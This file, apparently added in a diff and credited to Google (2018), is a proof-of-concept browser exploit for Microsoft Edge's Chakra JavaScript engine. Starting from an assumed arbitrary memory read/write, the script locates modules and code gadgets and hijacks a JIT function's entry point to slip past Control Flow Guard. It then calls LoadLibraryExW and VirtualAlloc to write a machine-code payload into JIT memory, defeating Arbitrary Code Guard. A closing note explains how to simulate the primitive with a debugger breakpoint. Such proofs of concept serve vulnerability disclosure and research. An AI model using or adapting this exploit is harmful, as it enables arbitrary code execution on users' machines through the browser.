@@ -1,0 +1,586 @@
+<!--
+
+Copyright 2018 Google LLC
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+    https://www.apache.org/licenses/LICENSE-2.0
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+limitations under the License.
+
+-->
+<script id="worker1" type="javascript/worker">
+  // This script won't be parsed by JS engines because its type is javascript/worker.
+
+  var workerarr = [];
+
+  var functionarr = [];
+  var nfunctions = 0;
+
+  var a = 0;
+
+  function jitFunction1(index) {
+    for(var i=0; i<10000; i++) {
+      functionarr[index](1);
+      functionarr[index](2);
+      functionarr[index](3);
+      functionarr[index](4);
+      functionarr[index](5);
+    }
+  }
+
+  function jitFunction2(index) {
+    for(var i=0; i<10000; i++) {
+      functionarr[index](1);
+      functionarr[index](2);
+      functionarr[index](3);
+      functionarr[index](4);
+      functionarr[index](5);
+    }
+  }
+
+  function sleep(millis)
+  {
+      var date = new Date();
+      var curDate = null;
+      do { curDate = new Date(); }
+      while(curDate-date < millis);
+  }
+
+  function onmessage1(e) {
+    if(e.data.name == "start") {
+      self.postMessage({name:"started"});
+    } else if(e.data.name == "leakarr") {
+      workerarr[0] = {toString: function() {
+        self.postMessage({name:"join"});
+        sleep(2000);
+      }};
+      workerarr.join();
+    } else if(e.data.name == "leakf") {
+      var functionstr = "a += " + e.data.param.toString() + "; a *= 2; a += 3;"
+      while(functionstr.length < 0x200) functionstr += functionstr;
+      functionarr[e.data.param] = Function(functionstr);
+      jitFunction1(e.data.param);
+      workerarr[0] = functionarr[e.data.param];
+      self.postMessage({name:"leakf"});
+    } else if(e.data.name == "switchf") {
+      self.onmessage = onmessage2;
+      self.postMessage({name:"switchf"});
+    }
+  }
+
+  function onmessage2(e) {
+    if(e.data.name == "leakf") {
+      var functionstr = "a += " + e.data.param.toString() + "; a *= 2; a += 3;"
+      while(functionstr.length < 0x200) functionstr += functionstr;
+      functionarr[e.data.param] = Function(functionstr);
+      jitFunction2(e.data.param);
+      workerarr[0] = functionarr[e.data.param];
+      self.postMessage({name:"leakf"});
+    }
+  }
+
+  self.onmessage = onmessage1;
+ 
+</script>
+<script>
+  var arr = [];
+  var arraddress1 = 0;
+  var arraddress2 = 0;
+  var scriptcontext2 = 0;
+  var threadcontext1 = 0;
+  var stack = 0;
+
+  var allocs = [];
+  var callobj;
+
+  var invoke;
+  var invoke2;
+  var unmapsourcecode;
+
+  var LoadLibraryExW;
+
+  var mapaddress;
+  var jitaddress;
+
+  var blob = new Blob([
+    document.getElementById("worker1").textContent
+  ], { type: "text/javascript" })
+
+  var buffer1 = new ArrayBuffer(0x1000);
+  var buffer2 = new ArrayBuffer(0x1000);
+
+  var payload = [0x48, 0xB8, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x00, 0x00, 0xFE, 0x00, 0x41, 0x43, 0x47, 0x20, 0x42, 0x59, 0x50, 0x41, 0x53, 0x53, 0x20];
+
+  // various helper functions for reading and writing memory
+
+  function setAddress(address) {
+    var a = new Uint32Array(buffer1);
+    a[14] = address % 0x100000000;
+    a[15] = Math.floor(address / 0x100000000);
+  }
+
+  function getAddress() {
+    var a = new Uint32Array(buffer1);
+    return a[14] + a[15] * 0x100000000;
+  }
+
+  function setSize(size) {
+    var a = new Uint32Array(buffer1);
+    a[16] = size;
+  }
+
+  function leakChakra() {
+    var a = new Uint32Array(buffer1);
+    return a[0] + a[1] * 0x100000000;
+  }
+
+  function readbyte(address) {
+    setAddress(address);
+    var a = new Uint8Array(buffer2);
+    return a[0];
+  }
+
+  function readword(address) {
+    setAddress(address);
+    var a = new Uint16Array(buffer2);
+    return a[0];
+  }
+
+  function readdword(address) {
+    setAddress(address);
+    var a = new Uint32Array(buffer2);
+    return a[0];
+  }
+
+  function readqword(address) {
+    setAddress(address);
+    var a = new Uint32Array(buffer2);
+    return a[0] + a[1] * 0x100000000;
+  }
+
+  function writeqword(address, value) {
+    setAddress(address);
+    var a = new Uint32Array(buffer2);
+    a[0] = value % 0x100000000;
+    a[1] = Math.floor(value / 0x100000000);
+  }
+
+  function writedword(address, value) {
+    setAddress(address);
+    var a = new Uint32Array(buffer2);
+    a[0] = value;
+  }
+
+  function writebyte(address, value) {
+    setAddress(address);
+    var a = new Uint8Array(buffer2);
+    a[0] = value;
+  }
+
+  function readint8(address) {
+    setAddress(address);
+    var a = new Int8Array(buffer2);
+    return a[0];
+  }
+
+  function readint16(address) {
+    setAddress(address);
+    var a = new Int16Array(buffer2);
+    return a[0];
+  }
+
+  function readint32(address) {
+    setAddress(address);
+    var a = new Int32Array(buffer2);
+    return a[0];
+  }
+
+  function writeint8(address, value) {
+    setAddress(address);
+    var a = new Int8Array(buffer2);
+    a[0] = value;
+  }
+
+  function writeint16(address, value) {
+    setAddress(address);
+    var a = new Int16Array(buffer2);
+    a[0] = value;
+  }
+
+  function writeint32(address, value) {
+    setAddress(address);
+    var a = new Int32Array(buffer2);
+    a[0] = value;
+  }
+
+  function alloc(size, data) {
+    var buf = new ArrayBuffer(size);
+    if(data) {
+      var a = new Uint8Array(buf);
+      for(var i=0; i<data.length; i++) {
+        a[i] = data[i];
+      }
+    }
+    arr[0] = buf;
+    var segmentaddr = readqword(arraddress1 + 0x30);
+    var objectaddr = readqword(segmentaddr + 0x18);
+    var bufaddr = readqword(objectaddr + 0x38);
+    allocs[allocs.length] = buf; //prevent from being garbage-collected
+    return bufaddr;
+  }
+
+  function searchInModule(base, pattern) {
+    var coff = readdword(base + 0x3c);
+    var imgsize = readdword(base + coff + 0x50);
+    setAddress(base);
+    setSize(imgsize);
+    var a = new Uint8Array(buffer2);
+    var i = 0x1000;
+    while(true) {
+      i = a.indexOf(pattern[0], i);
+      if(i < 0) {
+        alert('Error finding pattern');
+        return 0;
+      }
+      var found = true;
+      for(var j=0; j<pattern.length; j++) {
+        if(a[i+j] != pattern[j]) {
+          found = false;
+          break;
+        }
+      }
+      if(found) break;
+      i++;
+    }
+    setSize(0x1000);
+    return(base + i);
+  }
+
+  function strequal(address, name) {
+    setAddress(address);
+    var a = new Uint8Array(buffer2);
+    for(var i=0; i<name.length; i++) {
+      if(a[i] != name.charCodeAt(i)) return false;
+    }
+    if(a[name.length] == 0) return true;
+    return false;
+  }
+
+  function findimport(base, dllname, functionname) {
+    var coff = readdword(base + 0x3c);
+    var importdir = base + readdword(base + coff + 4 + 20 + 120);
+    while(true) {
+      var lookuptable = readdword(importdir);
+      if(lookuptable == 0) break;
+      lookuptable += base;
+      var addresstable = base + readdword(importdir + 16);
+      var dllnameptr = base + readdword(importdir + 12);
+      // prompt('dllnameptr', dllnameptr.toString(16));
+      if(strequal(dllnameptr, dllname)) {
+        // alert('dll found');
+        for(var i=0;;i++) {
+          var nameptr = readqword(lookuptable + i*8);
+          if(nameptr == 0) break;
+          nameptr += base + 2;
+          if(strequal(nameptr, functionname)) {
+            return readqword(addresstable + i*8);
+          }
+        }
+        break;
+      }
+      importdir += 20;
+    }
+    alert("import not found: " + functionname);
+  }
+
+  function getModuleBase(address) {
+    var baseaddress = address - address % 0x10000;
+    while(readword(baseaddress) != 0x5a4d) {
+      baseaddress = baseaddress - 0x10000;
+    }
+    return baseaddress;
+  }
+
+  function callfunction(f, param1, param2, param3, param4, param5) {
+    writeqword(callobj + 0x28, param2);
+    writeqword(callobj + 0x30, param3);
+    writeqword(callobj + 0x38, param4);
+    writeqword(callobj + 0x40, param5);
+    writeqword(callobj + 0x100 + 0x10, param1);
+    writeqword(callobj + 0x100 + 0x18, f);
+
+    callhelper();
+
+    //get the return value
+    var segmentaddr = readqword(arraddress1 + 0x30);
+    var ret = readqword(segmentaddr + 0x18);
+    arr[0] = 1;
+
+    return ret;
+  }
+
+  function init() {
+    // leak the base address of chakra
+    var chakravtable = leakChakra();
+    var chakra = getModuleBase(chakravtable);
+    alert('chakra: 0x' + chakra.toString(16));
+
+    // find useful gadgets
+    var codeaddr = searchInModule(chakra, [0x48, 0x83, 0x61, 0x70, 0x00, 0x48, 0x8b, 0x05]); //chakra!JsUtil::DoublyLinkedListElement
+
+    // search import for windows functions needed for the bypass
+    LoadLibraryExW = findimport(chakra, "api-ms-win-core-libraryloader-l1-1-0.dll", "LoadLibraryExW");
+ 
+    // prompt('UnmapViewOfFile2', UnmapViewOfFile2.toString(16));
+
+    // leak thread/script context, both current and that of the worker
+    // this is needed to be able to leak addresses of variables as well as the address of stack
+    var globaloffset = readdword(codeaddr + 8);
+    var globalListFirst = codeaddr + 12 + globaloffset;
+    // alert('globalListFirst: 0x' + globalListFirst.toString(16));
+    var threadcontext2 = readqword(globalListFirst);
+    threadcontext1 = readqword(threadcontext2 + 0x78);
+    var scriptcontext1 = readqword(threadcontext1 + 0x1e78);
+    scriptcontext2 = readqword(threadcontext2 + 0x1e78);
+
+    // prompt('threadcontext', threadcontext1.toString(16));
+
+    // leak address of arr in the main script context
+    arr[0] = {toString: function() {
+      //alert("in handler");
+      var list = readqword(scriptcontext1 + 0x3c0);
+      var listmembers = readqword(list + 8);
+      arraddress1 = readqword(listmembers);
+    }};
+    arr.join();
+    
+    // prompt("array", arraddress1.toString(16));
+
+    arr[0] = document.createElement("a");
+    var segmentaddr = readqword(arraddress1 + 0x30);
+    var objectaddr = readqword(segmentaddr + 0x18);
+    //prompt("objectaddr", objectaddr.toString(16));
+    var inedgehtml = readqword(objectaddr + 0x20);
+    var edgehtml = getModuleBase(inedgehtml);
+    alert('edgehtml: 0x' + edgehtml.toString(16));
+
+    // ControlToEdgeIOleHostHandleGetMetricsApcCall::Invoke
+    invoke = searchInModule(edgehtml, [0x48, 0x83, 0xec, 0x38, 0x4c, 0x8b, 0xd1, 0x48, 0x8b, 0x49, 0x20]);
+    // Microsoft::WRL::Details::InvokeHelper::Invoke
+    invoke2 = searchInModule(edgehtml, [0x4c, 0x8b, 0xdc, 0x49, 0x89, 0x53, 0x10, 0x49, 0x89, 0x4b, 0x08, 0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0xc1, 0x48, 0x8b, 0x49, 0x10, 0x48, 0x8b, 0x40, 0x18]);
+    unmapsourcecode = searchInModule(edgehtml, [0x48, 0x83, 0xec, 0x28, 0x48, 0x8b, 0x41, 0x28, 0x48, 0x83, 0xf8, 0x01]);
+
+    callobj = alloc(0x1000);
+    
+    // helper object that allows setting parameters before calling a CFG-allowed function
+    // see invoke/invoke2 code for details
+    writeqword(callobj, callobj);
+    writeqword(callobj + 0xE8, invoke);
+    writeqword(callobj + 0x20, callobj + 0x100);
+    writeqword(callobj + 0x28, 0x4141414142);
+    writeqword(callobj + 0x30, 0x4141414143);
+    writeqword(callobj + 0x38, 0x4141414144);
+    writeqword(callobj + 0x40, 0x4141414145);
+    writeqword(callobj + 0x100, callobj + 0x100);
+    writeqword(callobj + 0x100 + 0xE8, invoke2);
+    writeqword(callobj + 0x100 + 0x10, 0x4141414141);
+    writedword(callobj + 0x100 + 0x18, 0x41414141);
+    writedword(callobj + 0x100 + 0x18 + 4, 0x41414141);
+    
+    // prompt("invoke", invoke.toString(16));
+
+    arr[0] = entrypoint;
+    var segmentaddr = readqword(arraddress1 + 0x30);
+    var functionaddr = readqword(segmentaddr + 0x18);
+    var type = readqword(functionaddr + 8);
+    var entrypointaddr = type + 24;
+    // prompt("entrypoint", entrypointaddr.toString(16));
+
+    writeqword(entrypointaddr, invoke);
+    writeqword(functionaddr + 0x20, callobj);
+  }
+
+  var findex = 0;
+  var farray = new Array();
+
+  function acgbypass() {
+    var strmscoree = alloc(0x1000, [0x6D, 0x00, 0x73, 0x00, 0x63, 0x00, 0x6F, 0x00, 0x72, 0x00, 0x65, 0x00, 0x65, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00]);
+    var mscoree = callfunction(LoadLibraryExW, strmscoree, 0, 0, 0, 0);
+    // prompt("mscoree", mscoree.toString(16));
+
+    var virtualalloc = searchInModule(mscoree, [0x41, 0x8b, 0xc1, 0x4d, 0x8b, 0xd0, 0x44, 0x8b, 0x4c, 0x24, 0x28]);
+
+    // prepare a fake "this" object for UnmapSourceCode, need a html element so HeapFree would succeed
+    arr[0] = document.createElement("a");
+    var segmentaddr = readqword(arraddress1 + 0x30);
+    var objectaddr = readqword(segmentaddr + 0x18);
+    var htmlobject = readqword(objectaddr + 0x30);
+    writeqword(objectaddr + 0x30, 0);
+
+    var fakeobj = alloc(0x1000);
+    writedword(fakeobj + 0x28, 1);
+    writeqword(fakeobj + 0x30, htmlobject);
+    writeqword(htmlobject + 8, mapaddress);
+    writeqword(htmlobject + 0x10, 0);
+    writeqword(htmlobject + 0x18, 0);
+
+    callfunction(unmapsourcecode, fakeobj, 0, 0, 0, 0);
+    var ret = callfunction(virtualalloc, 0, mapaddress, 0x10000, 0x3000, 4);
+
+    if(ret == 0) {
+      alert('VirtualAlloc failed');
+    }
+
+    // write payload
+    var repeat = Math.floor(0x1000 / payload.length);
+    var index = 0;
+    for(var i=0; i<repeat; i++) {
+      for(var j=0; j< payload.length; j++) {
+        writebyte(jitaddress + index, payload[j]);
+        index++;
+      }
+    }
+
+    alert('done');
+  }
+
+  var worker = new Worker(window.URL.createObjectURL(blob)); 
+  worker.onmessage = function(e) {
+    if(e.data.name == "started") {
+      init();
+      worker.postMessage({name:"leakarr"});
+    } else if(e.data.name == "join") {
+      // leak the address of array in the worker script context
+      // this is going to be used to leak adresses of function jit
+      var list = readqword(scriptcontext2 + 0x3c0);
+      var listmembers = readqword(list + 8);
+      arraddress2 = readqword(listmembers);
+      // prompt("array2", arraddress2.toString(16));
+      worker.postMessage({name:"leakf", param: findex});
+    } else if(e.data.name == "leakf") {
+      // leak the address of function jit code from the worker
+      var segmentaddr = readqword(arraddress2 + 0x30);
+      var functionaddr = readqword(segmentaddr + 0x18);
+      var type = readqword(functionaddr + 8);
+      var entrypoint = readqword(type + 24);
+      var opcode = readbyte(entrypoint);
+      if(opcode == 0xe9) {
+        var offset = readint32(entrypoint+1);
+        entrypoint = entrypoint + offset + 5;
+      } else if(opcode == 0x48) {
+        entrypoint = readqword(entrypoint+2);
+      } else {
+        prompt("unexpected opcode at", entrypoint.toString(16));
+      }
+      farray[findex] = entrypoint;
+      prompt("JIT address", entrypoint.toString(16));
+      findex++;
+      if(findex == 5) {
+        worker.postMessage({name:"switchf"});
+      } else {
+        worker.postMessage({name:"leakf", param: findex});
+      }
+    } else if(e.data.name == "switchf") {
+      alert("We will not attempt the unmap. Next time a function is jitted it should execute the payload instead.");
+      mapaddress = farray[0] - farray[0] % 0x10000;
+      jitaddress = farray[findex-1] + 0x1000;
+      acgbypass();
+      worker.postMessage({name:"leakf", param: findex});
+    }
+  }
+
+  function testarray() {
+    try { Math.atan2(buffer1, buffer2); } catch(e) {}
+    var a = new Uint32Array(buffer1);
+    if(a[0] != 0) {
+      clearInterval(intervalid);
+      alert('arbitrary read/write detected');
+      //readdword(0x4141414141);
+      worker.postMessage({name:"start"}); // Start the worker.
+    }
+  }
+
+  var intervalid = setInterval(testarray, 1000);
+
+  // function whose entrypoint we are going to overwrite
+  // lots of junk so it doesn't get inlined
+  function entrypoint() {
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    arr[0] = (arr[0] + 1) % 1000;
+    return 1;
+  }
+
+  function callhelper() {
+    arr[0] = entrypoint();
+  }
+
+  function jithelper() {
+    for(var i=0;i<100000;i++) {
+      callhelper();
+      callhelper();
+      callhelper();
+      callhelper();
+      callhelper();
+    }
+  }
+
+  // make sure call helper is jitted
+  jithelper();
+
+</script>
+This PoC assumes the attacker already has an arbotrary read/write primitive.
+<br>
+To simulate a read/write primitive attach a debugger to this content process and run the following command:
+<br>
+bp chakra!Js::Math::Atan2 "eq r9+38 poi(rsp+28); g"
+
